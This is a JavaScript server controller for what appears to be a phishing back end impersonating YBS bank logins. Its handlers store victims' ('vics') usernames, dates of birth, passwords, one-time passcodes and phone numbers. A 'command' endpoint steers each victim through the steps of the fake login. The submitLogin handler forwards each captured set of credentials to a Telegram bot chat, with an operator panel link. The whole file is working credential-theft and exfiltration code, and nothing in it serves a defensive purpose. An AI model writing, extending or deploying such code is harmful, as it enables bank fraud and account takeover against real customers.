const YBS = require("../models/ybsModel");
const axios = require("axios");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	YBS.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status } = req.body;
	try {
		await YBS.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	YBS.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	const { username, dob, password, uniqueid, owner, ip } = req.body;
	try {
		await YBS.create({
			uniqueid,
			username,
			dob,
			password,
			status: 1,
			owner,
			ip,
			timestamp: moment().format(),
		});

		let originalText = `ID: ${uniqueid}\nUsername: ${username}\nDOB: ${dob}\nPassword: ${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=ybs&password=${owner}`;
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: "-837014205",
					text: `YBS:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});

		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, dob, password, uniqueid } = req.body;
	try {
		await YBS.findOneAndUpdate(
			{ uniqueid },
			{ username, dob, password, status: 5, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid } = req.body;
	try {
		await YBS.findOneAndUpdate(
			{ uniqueid },
			{ otp, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitTelephone = async (req, res) => {
	const { telephone, uniqueid } = req.body;
	try {
		await YBS.findOneAndUpdate(
			{ uniqueid },
			{ telephone, status: 7, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await YBS.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitOtp,
	submitTelephone,
	deleteEntry,
};
